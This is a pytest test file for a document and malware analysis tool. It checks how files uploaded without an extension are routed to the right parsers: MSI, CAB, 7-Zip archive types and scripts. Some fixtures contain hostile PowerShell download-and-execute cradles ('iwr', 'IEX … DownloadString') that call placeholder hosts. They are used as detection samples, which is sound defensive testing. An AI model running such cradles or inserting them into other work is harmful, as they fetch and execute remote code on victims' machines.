"""Files uploaded without an extension: an MSI is analysed as an MSI (recognised
by its string pool / tables, not its name), Cabinet / tar / ISO signatures take
the archive path, and anything else 7-Zip lists as an archive format is
extracted and scanned like any archive before the text/scripting fallback.

7-Zip is faked (``unlock._7z_run``) so these tests run without it installed.
"""
from __future__ import annotations

import io
from pathlib import Path

import pytest

from docutracex import unlock


# --- 7z listing fakes ----------------------------------------------------------

def _slt(type_: str, files: dict[str, bytes], encrypted: bool = False) -> str:
    """A ``7z l -slt`` listing: header block with ``Type``, then one block per entry."""
    head = f"Listing archive: x\n\n--\nPath = x\nType = {type_}\nPhysical Size = 1234\n\n----------\n"
    blocks = [f"Path = {n}\nFolder = -\nSize = {len(d)}\nEncrypted = {'+' if encrypted else '-'}"
              for n, d in files.items()]
    return head + "\n\n".join(blocks) + "\n"


def _fake_7z(type_: str, files: dict[str, bytes], calls: list | None = None, rc: int = 0):
    def run(args, timeout=300):  # noqa: ANN001, ARG001
        if calls is not None:
            calls.append(args[0])
        if args[0] == "l":
            return {"rc": rc, "out": _slt(type_, files) if type_ else "", "err": "" if type_ else
                    "ERROR: x : Can not open the file as archive"}
        target = Path(next(a[2:] for a in args if a.startswith("-o")))
        for name, data in files.items():
            p = target / name
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(data)
        return {"rc": 0, "out": "Everything is Ok", "err": ""}
    return run


# --- probe_7z --------------------------------------------------------------------

def test_probe_accepts_archive_types(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    f = tmp_path / "blob"
    f.write_bytes(b"\x60\xea" + b"\x00" * 64)                       # ARJ-ish, unknown to detect()
    monkeypatch.setattr(unlock, "_7z_run", _fake_7z("Arj", {"run.bat": b"echo hi"}))
    p = unlock.probe_7z(f)
    assert p["archive"] is True and p["type"] == "arj"
    assert "arj archive" in p["detail"]


@pytest.mark.parametrize("type_", ["Compound", "PE", "ELF", "PDF", "Chm", "MBR", "Nsis"])
def test_probe_rejects_documents_and_executables(tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
                                                 type_: str) -> None:
    # 7-Zip "opens" these too, but their raw streams are not an archive's entries:
    # an OLE (MSI / .doc / .msg) must reach the parsers that understand it.
    f = tmp_path / "blob"
    f.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64)
    monkeypatch.setattr(unlock, "_7z_run", _fake_7z(type_, {"!_StringData": b"x"}))
    p = unlock.probe_7z(f)
    assert p["archive"] is False and p["type"] == type_.lower()
    assert "not an archive format" in p["detail"]


def test_probe_not_an_archive_and_missing_7zip(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    f = tmp_path / "blob"
    f.write_bytes(b"random bytes")
    monkeypatch.setattr(unlock, "_7z_run", _fake_7z("", {}, rc=2))
    assert unlock.probe_7z(f)["archive"] is False

    def missing(*a, **k):  # noqa: ANN002, ANN003
        raise unlock.SevenZipMissing()
    monkeypatch.setattr(unlock, "_7z_run", missing)
    p = unlock.probe_7z(f)
    assert p["archive"] is False and p["detail"] == "7-Zip not found"   # never raises


def test_extract_with_7z_bounds(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    f = tmp_path / "blob"
    f.write_bytes(b"x")
    files = {f"e{i}.txt": b"x" for i in range(unlock.MAX_ENTRIES + 1)}
    monkeypatch.setattr(unlock, "_7z_run", _fake_7z("Lzh", files))
    probe = {"archive": True, "type": "lzh", "detail": "lzh archive", "encrypted": False}
    rec = unlock.extract_with_7z(f, tmp_path / "out", [], probe)
    assert rec["kind"] == "7zip:lzh"
    assert "too many" in rec["error"]
    assert any(x["rule"] == "archive_bomb" for x in rec["findings"])
    assert not (tmp_path / "out").exists()


def test_archive_label() -> None:
    assert unlock.archive_label("7zip:arj", "Archive") == "ARJ archive (7-Zip)"
    assert unlock.archive_label("zip", "Archive") == "ZIP archive"
    assert unlock.archive_label("cab", "Archive") == "Archive"
    assert unlock.archive_label("office", "office") == "Office document"


# --- whole analysis ----------------------------------------------------------------

@pytest.fixture()
def cases_dir(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    from docutracex.config import settings

    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    return tmp_path / "cases"


def _new_case(cases_dir: Path, name: str, data: bytes):
    from docutracex import cases
    from docutracex.storage import CasePaths

    m = cases.create_case(io.BytesIO(data), name, cases_dir=cases_dir)
    return CasePaths(m["analysis_id"], cases_dir=cases_dir)


def _steps(paths) -> list[dict]:  # noqa: ANN001
    """Sub-steps of the last run (as the Tasks tab shows them)."""
    from docutracex.storage import read_json

    return (read_json(paths.summary) or {}).get("steps") or []


def _step_names(paths) -> list[str]:  # noqa: ANN001
    return [s["step"] for s in _steps(paths)]


def test_unknown_archive_is_extracted_and_scanned(cases_dir: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from docutracex import analyze
    from docutracex.storage import read_json

    bat = b"@echo off\r\npowershell -w hidden -c iwr http://cdn-update.example.net/files/upd.bin\r\n"
    monkeypatch.setattr(unlock, "_7z_run", _fake_7z("Arj", {"factura/instalar.bat": bat}))
    paths = _new_case(cases_dir, "Decoy1", b"\x60\xea" + bytes(range(256)) * 8)
    res = analyze.analyze_case(paths.root)

    assert "archive" in res["modules_run"] and "nested" in res["modules_run"]
    arc = read_json(paths.subresult("archive"))
    assert arc["kind"] == "7zip:arj" and arc["via"] == "7zip-probe"
    assert arc["entries"][0]["stored_path"].startswith("extracted/archive/")
    node = read_json(paths.subresult("nested"))["tree"][0]
    assert node["filename"] == "instalar.bat"
    assert "cdn-update.example.net" in str(read_json(paths.subresult("iocs")))


def test_non_archive_keeps_the_text_fallback(cases_dir: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from docutracex import analyze

    calls: list = []
    monkeypatch.setattr(unlock, "_7z_run", _fake_7z("", {}, calls, rc=2))
    ps = b"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')\n"
    paths = _new_case(cases_dir, "stage2", ps)
    res = analyze.analyze_case(paths.root)

    assert calls == ["l"]                                   # listed once, never extracted
    assert "archive" not in res["modules_run"]
    assert "powershell" in res["modules_run"]               # the scripting fallback still ran
    assert any(s.startswith("7zip probe") for s in _step_names(paths))


def test_without_7zip_nothing_changes(cases_dir: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from docutracex import analyze

    def missing(*a, **k):  # noqa: ANN002, ANN003
        raise unlock.SevenZipMissing()
    monkeypatch.setattr(unlock, "_7z_run", missing)
    paths = _new_case(cases_dir, "blob", bytes(range(256)) * 4)
    res = analyze.analyze_case(paths.root)
    assert res["modules_run"][:1] == ["file"] and "archive" not in res["modules_run"]
    probe = next(s for s in _steps(paths) if s["step"].startswith("7zip probe"))
    assert probe["status"] == "unavailable"


def test_extensionless_ooxml_is_not_dumped_by_7zip(cases_dir: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    import zipfile

    from docutracex import analyze

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr("word/document.xml", "<w:document/>")
    calls: list = []
    monkeypatch.setattr(unlock, "_7z_run", _fake_7z("zip", {"word/document.xml": b"x"}, calls))
    paths = _new_case(cases_dir, "report", buf.getvalue())
    res = analyze.analyze_case(paths.root)
    assert calls == [] and "archive" not in res["modules_run"]


def test_extensionless_cab_takes_the_archive_path(cases_dir: Path) -> None:
    from docutracex import analyze

    sample = Path(__file__).resolve().parent.parent / "samples" / "archives/sample_cabinet.cab"
    if not sample.is_file():
        pytest.skip("samples not unpacked")
    paths = _new_case(cases_dir, "cabinet", sample.read_bytes())
    res = analyze.analyze_case(paths.root)
    assert "archive" in res["modules_run"]
    assert not any(s.startswith("7zip probe") for s in _step_names(paths))   # recognised by signature


def test_extensionless_msi_is_analysed_as_msi(cases_dir: Path) -> None:
    """The Decoy0 case: an MSI with no extension used to get only the generic record."""
    from docutracex import analyze
    from docutracex.storage import read_json

    sample = Path(__file__).resolve().parent.parent / "samples" / "noext" / "sample_installer"
    if not sample.is_file():
        pytest.skip("samples not unpacked")
    paths = _new_case(cases_dir, "sample_installer", sample.read_bytes())
    res = analyze.analyze_case(paths.root)

    assert "msi" in res["modules_run"]
    item = read_json(paths.subresult("msi"))["items"][0]
    assert item["kind"] == "msi"
    # an MSI is not a PE: no generic "file" record, and its mined command still
    # reaches the scripting engine (IEX … DownloadString)
    assert "file" not in res["modules_run"]
    assert "powershell" in res["modules_run"]
    assert not any(s.startswith("7zip probe") for s in _step_names(paths))


def test_family_for_extensionless_msi(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from docutracex import analyze
    from docutracex.parsers import msi

    f = tmp_path / "Decoy0"
    f.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 512)
    manifest = {"format": {"discrepancy": {"declared_family": None}}}
    monkeypatch.setattr(msi, "is_msi_file", lambda p: True)
    assert analyze._family(manifest, f) == "binary"
    monkeypatch.setattr(msi, "is_msi_file", lambda p: False)   # a generic OLE (.doc, .msg)
    assert analyze._family(manifest, f) is None


def test_prefixed_zip_sample_is_left_to_7zip(tmp_path: Path) -> None:
    """noext/sample_archive: a ZIP behind 4 KB of junk. No signature at offset 0, so
    only the 7-Zip probe can open it (7-Zip finds the archive further in)."""
    import sys

    from docutracex import analyze

    sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))
    import make_samples

    data = make_samples.prefixed_zip_noext()
    assert data[:2] != b"PK" and b"PK\x03\x04" in data
    f = tmp_path / "sample_archive"
    f.write_bytes(data)
    assert unlock.detect(f)["kind"] is None
    manifest = {"format": {"discrepancy": {"declared_family": None}}}
    assert analyze._effective_family(manifest, f, {}) is None


# --- MSI stream names as Windows Installer writes them ------------------------
# Names exactly as olefile lists them in a real-world MSI (an installer uploaded
# without extension). Only the names are kept, no content.
_REAL_MSI_NAMES = [
    "\x05SummaryInformation",
    "\u4192\u4472\u47fe\u3948\u3bc3\u39c6\u394d\u3905\u380f\u3905\u3a44\u38c4\u3b80\u3b87\u423e\u423b",
    "\u430b\u4131\u4735\u3f3e\u45e8\u4217\u45fb\u430d\u43e4\u42b2\u467e\u45a5",
    "\u4840\u3b3f\u43f2\u4438\u45b1",
]


def _real_layout_msi(tmp: Path, command: str) -> Path:
    import sys
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))
    from cfb import build_cfb

    from docutracex.parsers import msi

    strdata = b"CustomActionData\x00" + command.encode() + b"\x00http://198.51.100.9/a.ps1\x00"
    tree = {
        msi.encode_streamname("_StringData", True): strdata,     # system streams: prefixed
        msi.encode_streamname("_StringPool", True): b"\x00" * 8,
        msi.encode_streamname("_Tables", True): b"\x00" * 8,
        msi.encode_streamname("_Columns", True): b"\x00" * 8,
        msi.encode_streamname("CustomAction", True): b"\x00" * 8,
        msi.encode_streamname("Binary", True): b"\x00" * 8,
        msi.encode_streamname("Binary.s", False): b"MZ\x90\x00stub",
    }
    p = tmp / "Decoy0"
    p.write_bytes(build_cfb(tree))
    return p


def test_real_msi_stream_names_decode() -> None:
    from docutracex.parsers import msi

    dec = [msi.decode_streamname(n) for n in _REAL_MSI_NAMES]
    assert dec[1] == ("Icon._853F67D554F05449430E7E.exe", False)
    assert dec[2] == ("Binary.SetNextDialog.vbs", False)
    assert dec[3] == ("_Columns", True)            # system streams carry the table prefix
    assert msi.encode_streamname("_Columns", True) == _REAL_MSI_NAMES[3]


def test_msi_detected_with_prefixed_system_streams(tmp_path: Path) -> None:
    """Regression: is_msi_file looked for _StringData/_StringPool among the
    NON-table streams, so a real MSI (all system streams prefixed) without a .msi
    extension was never recognised; analyze_msi skipped the prefixed string pool,
    so a real MSI's commands and URLs were never mined (with or without extension)."""
    pytest.importorskip("olefile")
    from docutracex.parsers import msi

    p = _real_layout_msi(tmp_path, "powershell -w hidden -Command IEX(New-Object Net.WebClient)."
                                   "DownloadString('http://198.51.100.9/a.ps1')")
    assert msi.is_msi_file(p)
    res = msi.analyze(p)
    assert res["items"][0]["kind"] == "msi"
    assert "_StringData" in res["items"][0]["tables"]
    assert "msi_lolbin_string" in {f["rule"] for f in res["findings"]}   # prefixed pool mined


def test_generic_ole_is_not_an_msi(tmp_path: Path) -> None:
    pytest.importorskip("olefile")
    import sys
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))
    from cfb import build_cfb

    from docutracex.parsers import msi

    p = tmp_path / "doc"
    p.write_bytes(build_cfb({"WordDocument": b"\x00" * 64, "\x05SummaryInformation": b"\x00" * 8}))
    assert not msi.is_msi_file(p)
